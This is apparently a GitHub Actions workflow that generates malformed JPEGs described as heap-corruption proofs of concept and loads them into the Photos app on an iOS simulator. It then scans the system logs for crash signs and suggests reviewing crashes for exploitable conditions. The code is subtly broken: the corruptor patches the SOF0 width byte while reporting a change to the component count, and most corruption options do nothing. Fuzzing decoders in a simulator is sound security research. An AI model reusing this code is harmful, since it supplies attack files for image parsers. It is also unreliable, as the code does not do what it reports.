name: iOS JPEG Heap Corruption + System Log Analysis

on:
  workflow_dispatch:
    inputs:
      corruption_type:
        description: 'Corruption type'
        required: true
        default: 'component_mismatch'
        type: choice
        options:
        - component_mismatch
        - scan_mismatch
        - allocation_bomb
        - huffman_overflow
      log_level:
        description: 'System log verbosity'
        required: false
        default: 'debug'
        type: choice
        options:
        - info
        - debug
        - verbose

jobs:
  fuzz-corrupt-and-log:
    runs-on: macos-latest
    name: iOS Simulator + Heap + System Log Analysis

    steps:
      - name: 1. Checkout Repository
        uses: actions/checkout@v4
        with:
          path: main

      - name: 2. Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: 3. Install Dependencies
        run: |
          brew install jq gnu-time coreutils
          python -m pip install --upgrade pip pillow colorama

      - name: 4. Boot iOS Simulator with Enhanced Logging
        id: boot_simulator
        run: |
          set -euo pipefail
          DEVICE_NAME="iPhone 16 Pro"
          RUNTIME=$(xcrun simctl list runtimes | grep -E "iOS [0-9]+\.[0-9]+" | sort -V | tail -n 1 | awk '{print $NF}' || echo "com.apple.CoreSimulator.SimRuntime.iOS-18-0")
          
          echo "--- Cleaning old simulators ---"
          xcrun simctl delete all || true
          
          echo "--- Creating fresh simulator ---"
          UDID=$(xcrun simctl create "HeapCorruptLogDevice" "$DEVICE_NAME" "$RUNTIME")
          echo "UDID=${UDID}" >> "$GITHUB_ENV"
          
          echo "--- Booting simulator with logging ---"
          xcrun simctl boot "$UDID"
          
          gtimeout 120 xcrun simctl bootstatus "$UDID" -b
          
          echo "--- Configuring logging ---"
          xcrun simctl spawn "$UDID" log config --mode level:${{ github.event.inputs.log_level || 'debug' }}
          xcrun simctl spawn "$UDID" log config --subsystem com.apple.photos --mode level:debug
          xcrun simctl spawn "$UDID" log config --subsystem com.apple.imageio --mode level:debug
          xcrun simctl spawn "$UDID" log config --subsystem CoreImage --mode level:debug
          
          echo "‚úÖ Booted simulator with enhanced logging: $DEVICE_NAME ($UDID)"

      - name: 5. Create JPEG Corruptor Script
        run: |
          cat > main/jpeg_heap_corruptor.py << 'EOF'
#!/usr/bin/env python3
import sys
import hashlib
from pathlib import Path
from PIL import Image
import io

def calculate_hash(data):
    return hashlib.sha256(data).hexdigest()

def create_jpeg_mismatch_poc(width=512, height=512, output_file="heap_corrupt.jpg"):
    print(f"Creating JPEG heap corruption PoC: {output_file}")
    
    img = Image.new('L', (width, height), color=128)
    buffer = io.BytesIO()
    img.save(buffer, format='JPEG', quality=85, optimize=False)
    jpeg_data = bytearray(buffer.getvalue())
    
    print(f"Original JPEG size: {len(jpeg_data):,} bytes")
    original_hash = calculate_hash(jpeg_data)
    print(f"Original SHA256: {original_hash}")
    
    sof0_offset = jpeg_data.find(b'\xFF\xC0')
    if sof0_offset == -1:
        print("‚ùå SOF0 marker not found!")
        return False
    
    components_offset = sof0_offset + 7
    if components_offset >= len(jpeg_data):
        print("‚ùå Cannot locate components field")
        return False
    
    current_components = jpeg_data[components_offset]
    print(f"Found SOF0 at 0x{sof0_offset:04X}, components at 0x{components_offset:04X}")
    print(f"Current components: 0x{current_components:02X}")
    
    if current_components != 1:
        print(f"Warning: Expected 1 component, found {current_components}")
    
    jpeg_data[components_offset] = 3
    Path(output_file).write_bytes(jpeg_data)
    modified_hash = calculate_hash(jpeg_data)
    
    print("‚úÖ JPEG heap corruption PoC created!")
    print(f"   Manipulation: SOF0 components 0x01 ‚Üí 0x03")
    print(f"   Output: {output_file}")
    print(f"Modified SHA256: {modified_hash}")
    
    return True

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 jpeg_heap_corruptor.py batch <count> <prefix>")
        sys.exit(1)
    
    cmd = sys.argv[1].lower()
    if cmd == "batch":
        count = int(sys.argv[2])
        prefix = sys.argv[3]
        for i in range(count):
            filename = f"{prefix}_{i:03d}.jpg"
            if create_jpeg_mismatch_poc(output_file=filename):
                print(f"‚úÖ Created {filename}")

if __name__ == "__main__":
    main()
EOF

      - name: 6. Generate Heap Corruption JPEGs
        id: generate_corrupt
        run: |
          set -euo pipefail
          CORRUPTION_TYPE="${{ github.event.inputs.corruption_type || 'component_mismatch' }}"
          echo "Using corruption type: $CORRUPTION_TYPE"
          
          mkdir -p main/malicious_jpegs
          cd main
          
          python3 jpeg_heap_corruptor.py batch 5 "heap_corrupt_${CORRUPTION_TYPE}"
          
          mkdir -p ../dcim_upload
          cp *.jpg ../dcim_upload/
          
          echo "--- Generated $(ls -1 *.jpg 2>/dev/null | wc -l) corrupted JPEGs ---"
          ls -la *.jpg

      - name: 7. Upload Corrupted JPEGs to Simulator
        run: |
          set -euo pipefail
          if [ "$(ls -1 dcim_upload | wc -l)" -eq 0 ]; then
            echo "::error::No corrupted JPEGs found to upload!"
            exit 1
          fi
          
          echo "--- Uploading $(ls -1 dcim_upload | wc -l) corrupted JPEGs to Photos ---"
          xcrun simctl addmedia "$UDID" dcim_upload/*.jpg
          sleep 5

      - name: 8. Enhanced System Log Capture Setup
        run: |
          set -euo pipefail
          mkdir -p system_logs baseline_logs
          
          echo "--- Starting baseline system log capture ---"
          xcrun simctl spawn "$UDID" log stream \
            --predicate 'subsystem == "com.apple.photos" OR subsystem == "com.apple.imageio" OR subsystem == "CoreImage"' \
            --style syslog \
            --info \
            > baseline_logs/system_baseline.log 2>&1 &
          BASELINE_PID=$!
          echo "BASELINE_PID=$BASELINE_PID" >> "$GITHUB_ENV"
          
          sleep 3

      - name: 9. Per-JPEG Testing with Real-time Log Capture
        run: |
          set -euo pipefail
          mkdir -p instruments_trace detailed_logs crash_logs
          
          APP_BUNDLE_ID="com.apple.mobileslideshow"
          JPEG_COUNT=$(ls -1 dcim_upload/*.jpg | wc -l)
          echo "Processing $JPEG_COUNT corrupted JPEGs with detailed logging..."
          
          for i in $(seq 1 $JPEG_COUNT); do
            JPEG_FILE=$(ls -1 dcim_upload/*.jpg | head -n $i | tail -n 1)
            BASENAME=$(basename "$JPEG_FILE" .jpg)
            
            echo ""
            echo "üîç [$i/$JPEG_COUNT] Testing $BASENAME with comprehensive logging"
            echo "================================================================"
            
            mkdir -p "detailed_logs/$BASENAME"
            LOG_DIR="detailed_logs/$BASENAME"
            
            echo "--- Killing Photos for clean test ---"
            xcrun simctl spawn "$UDID" killall -9 "$APP_BUNDLE_ID" || true
            sleep 3
            
            echo "--- Starting detailed log capture ---"
            
            # Photos and ImageIO logs
            xcrun simctl spawn "$UDID" log stream \
              --predicate 'subsystem == "com.apple.photos" OR subsystem == "com.apple.imageio"' \
              --style syslog \
              --debug \
              --last 5s \
              > "$LOG_DIR/photos_imageio.log" 2>&1 &
            PHOTOS_LOG_PID=$!
            
            # Memory-related logging
            xcrun simctl spawn "$UDID" log stream \
              --predicate 'category == "memory" OR category == "malloc" OR category == "heap"' \
              --style syslog \
              --debug \
              --last 5s \
              > "$LOG_DIR/memory_events.log" 2>&1 &
            MEMORY_PID=$!
            
            # Crash/fault detection
            xcrun simctl spawn "$UDID" log stream \
              --predicate 'message CONTAINS "EXC" OR message CONTAINS "crash" OR message CONTAINS "fault"' \
              --style syslog \
              --info \
              --last 5s \
              > "$LOG_DIR/crash_events.log" 2>&1 &
            CRASH_PID=$!
            
            sleep 2
            
            echo "--- Launching Photos ---"
            xcrun simctl launch "$UDID" "$APP_BUNDLE_ID" &
            PHOTOS_LAUNCH_PID=$!
            sleep 4
            
            echo "--- Opening Photos app ---"
            xcrun simctl spawn "$UDID" open "photos://" || true
            
            echo "--- Monitoring for 15 seconds ---"
            sleep 15
            
            echo "--- Stopping log capture processes ---"
            kill $PHOTOS_LOG_PID $MEMORY_PID $CRASH_PID 2>/dev/null || true
            wait $PHOTOS_LOG_PID $MEMORY_PID $CRASH_PID 2>/dev/null || true
            
            echo "--- Killing Photos ---"
            xcrun simctl spawn "$UDID" killall "$APP_BUNDLE_ID" || true
            sleep 3
            
            echo "--- Capturing post-test diagnostics ---"
            
            # Check for crash reports
            xcrun simctl spawn "$UDID" log stream \
              --predicate 'subsystem == "com.apple.foundation" AND category == "malloc"' \
              --last 30s \
              --style syslog > "$LOG_DIR/malloc_errors.log" 2>&1 || true
            
            # System memory status
            xcrun simctl spawn "$UDID" vm_stat > "$LOG_DIR/memory_status.txt" 2>&1 || true
            
            echo "‚úÖ Completed testing $BASENAME - logs saved to $LOG_DIR/"
            
            echo "--- Quick log analysis for $BASENAME ---"
            if grep -qi "EXC\|crash\|abort\|segfault\|malloc" "$LOG_DIR"/* 2>/dev/null; then
              echo "üö® CRITICAL: Crash indicators found!"
              grep -i "EXC\|crash\|abort\|segfault\|malloc" "$LOG_DIR"/* | head -10
            elif grep -qi "error\|fail\|invalid\|corrupt" "$LOG_DIR"/* 2>/dev/null; then
              echo "‚ö†Ô∏è  WARNING: Error conditions detected"
              grep -i "error\|fail\|invalid\|corrupt" "$LOG_DIR"/* | head -5
            else
              echo "‚ÑπÔ∏è  INFO: No obvious errors detected"
            fi
          done
          
          kill $BASELINE_PID 2>/dev/null || true
          wait $BASELINE_PID 2>/dev/null || true

      - name: 10. Create Log Analysis Script
        run: |
          cat > log_analyzer.py << 'EOF'
#!/usr/bin/env python3
import os
import re
from pathlib import Path
from datetime import datetime
import json
import glob

def analyze_logs():
    log_dir = Path("detailed_logs")
    analysis_dir = Path("log_analysis")
    analysis_dir.mkdir(exist_ok=True)
    
    # Critical patterns
    crash_patterns = [
        r'EXC_(BAD_ACCESS|ARITHMETIC|BREAKPOINT)',
        r'SIG(SEGV|ABRT|BUS|ILL|TRAP|EMT|FPE)',
        r'\*\*\*.*(crash|abort|terminate)',
        r'malloc:.*(error|corruption|double free)',
        r'heap corruption detected',
        r'invalid pointer',
        r'buffer overflow'
    ]
    
    # Memory patterns
    memory_patterns = [
        r'malloc.*(large|small|zone)',
        r'vm_allocate.*(success|failure)',
        r'memory pressure',
        r'heap.*(grow|shrink|corrupt)',
        r'page.*(fault|in|out)'
    ]
    
    # ImageIO patterns
    imageio_patterns = [
        r'ImageIO.*(error|fail|invalid|corrupt)',
        r'JPEG.*(decode|parse|component|error)',
        r'CIImage.*(invalid|corrupt|fail)',
        r'CGImage.*(error|invalid|corrupt)'
    ]
    
    analyses = []
    test_dirs = [d.name for d in log_dir.iterdir() if d.is_dir()]
    print(f"Found {len(test_dirs)} test cases to analyze")
    
    for test_name in test_dirs:
        test_dir = log_dir / test_name
        print(f"üîç Analyzing {test_name}...")
        
        analysis = {
            'test_name': test_name,
            'timestamp': datetime.now().isoformat(),
            'crash_indicators': [],
            'memory_events': [],
            'imageio_errors': [],
            'severity': 'INFO'
        }
        
        # Process each log file
        all_files = list(test_dir.glob("*"))
        for file_path in all_files:
            if not file_path.is_file():
                continue
                
            try:
                content = file_path.read_text(encoding='utf-8', errors='ignore')
                
                # Crash analysis
                for pattern in crash_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
                    if matches:
                        analysis['crash_indicators'].extend(matches)
                        analysis['severity'] = 'CRITICAL'
                
                # Memory analysis
                for pattern in memory_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
                    if matches:
                        analysis['memory_events'].extend(matches)
                
                # ImageIO analysis
                for pattern in imageio_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
                    if matches:
                        analysis['imageio_errors'].extend(matches)
                        if 'error' in ' '.join(matches).lower():
                            analysis['severity'] = 'HIGH' if analysis['severity'] == 'INFO' else analysis['severity']
                        
            except Exception as e:
                print(f"Warning: Could not analyze {file_path}: {e}")
        
        # Count unique events
        analysis['crash_count'] = len(set(analysis['crash_indicators']))
        analysis['memory_event_count'] = len(set(analysis['memory_events']))
        analysis['imageio_error_count'] = len(set(analysis['imageio_errors']))
        
        # Save detailed analysis
        detail_file = analysis_dir / f"{test_name}_analysis.json"
        with open(detail_file, 'w') as f:
            json.dump(analysis, f, indent=2)
        
        analyses.append(analysis)
    
    # Generate summary report
    summary_file = Path("summary_reports") / "heap_corruption_summary.md"
    summary_file.parent.mkdir(exist_ok=True)
    
    report_content = f"""# iOS JPEG Heap Corruption Analysis Summary

**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC  
**Total Tests:** {len(analyses)}  

## Test Results

| Test | Severity | Crashes | Memory Events | ImageIO Errors |
|------|----------|---------|---------------|----------------|
"""
    
    critical_count = 0
    high_count = 0
    
    for analysis in analyses:
        sev_emoji = {'CRITICAL': 'üö®', 'HIGH': 'üî¥', 'INFO': '‚ÑπÔ∏è'}[analysis['severity']]
        
        report_content += f"| {analysis['test_name']} | {sev_emoji} {analysis['severity']} | {analysis['crash_count']} | {analysis['memory_event_count']} | {analysis['imageio_error_count']} |\n"
        
        if analysis['severity'] == 'CRITICAL':
            critical_count += 1
        elif analysis['severity'] == 'HIGH':
            high_count += 1
    
    report_content += """

## Key Findings
"""
    
    if critical_count > 0:
        report_content += f"- üö® {critical_count} tests caused CRASHES\\n"
    if high_count > 0:
        report_content += f"- üî¥ {high_count} tests triggered HIGH severity issues\\n"
    
    if any(a['crash_count'] > 0 for a in analyses):
        report_content += "- üí£ CRASHES DETECTED: Review detailed_logs/ for exception details\\n"
    
    report_content += """
## Recommendations
- Review crash logs for exploitable conditions
- Check malloc error patterns for heap corruption
- Test additional corruption variants
"""
    
    with open(summary_file, 'w') as f:
        f.write(report_content)
    
    print(f"üìä Summary report saved: {summary_file}")
    print(f"\nTOP FINDINGS:")
    if critical_count > 0:
        print(f"  ‚Ä¢ üö® {critical_count} CRASHES detected")
    if high_count > 0:
        print(f"  ‚Ä¢ üî¥ {high_count} HIGH severity issues")
    print("="*60)
    
    return analyses

if __name__ == "__main__":
    analyze_logs()
EOF

      - name: 11. Run Log Analysis
        run: |
          set -euo pipefail
          mkdir -p log_analysis summary_reports
          
          echo "--- Processing and analyzing system logs ---"
          python3 log_analyzer.py

      - name: 12. Create Comprehensive Artifact Package
        run: |
          set -euo pipefail
          echo "--- Creating comprehensive analysis package ---"
          
          ARTIFACT_NAME="ios-jpeg-heap-analysis-complete-${{ github.run_id }}"
          
          zip -r "${ARTIFACT_NAME}.zip" \
            instruments_trace/ \
            detailed_logs/ \
            log_analysis/ \
            summary_reports/ \
            crash_logs/ \
            system_logs/ \
            baseline_logs/ \
            dcim_upload/ \
            *.txt *.json *.md 2>/dev/null || true
          
          echo "üì¶ Main package: ${ARTIFACT_NAME}.zip ($(du -sh ${ARTIFACT_NAME}.zip | cut -f1))"

      - name: 13. Upload Primary Analysis Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: ios-jpeg-heap-analysis-${{ github.run_id }}
          path: |
            *.zip
            summary_reports/
            log_analysis/
          retention-days: 30

      - name: 14. Upload Detailed Logs
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: detailed-system-logs-${{ github.run_id }}
          path: |
            detailed_logs/
            baseline_logs/
            crash_logs/
          retention-days: 14
          if-no-files-found: warn

      - name: 15. Final Summary Report
        if: always()
        run: |
          echo ""
          echo "üéØ FINAL ANALYSIS SUMMARY"
          echo "=========================="
          
          CRITICAL_COUNT=$(grep -c "CRITICAL" summary_reports/*.md 2>/dev/null || echo 0)
          HIGH_COUNT=$(grep -c "HIGH" summary_reports/*.md 2>/dev/null || echo 0)
          
          if [ "$CRITICAL_COUNT" -gt 0 ]; then
            echo "üö® CRITICAL: $CRITICAL_COUNT crash(es) detected!"
            echo "   Review detailed_logs/ for crash details"
          fi
          
          if [ "$HIGH_COUNT" -gt 0 ]; then
            echo "üî¥ HIGH: $HIGH_COUNT severe error(s) found"
          fi
          
          echo ""
          echo "üìÅ Key artifacts uploaded:"
          echo "   - ios-jpeg-heap-analysis-*: Main analysis + summaries"
          echo "   - detailed-system-logs-*: Raw log files"
          echo ""
          echo "Next steps:"
          echo "1. Download 'ios-jpeg-heap-analysis' artifact first"
          echo "2. Review summary_reports/heap_corruption_summary.md"
          echo "3. Investigate detailed_logs/ for crash root cause"
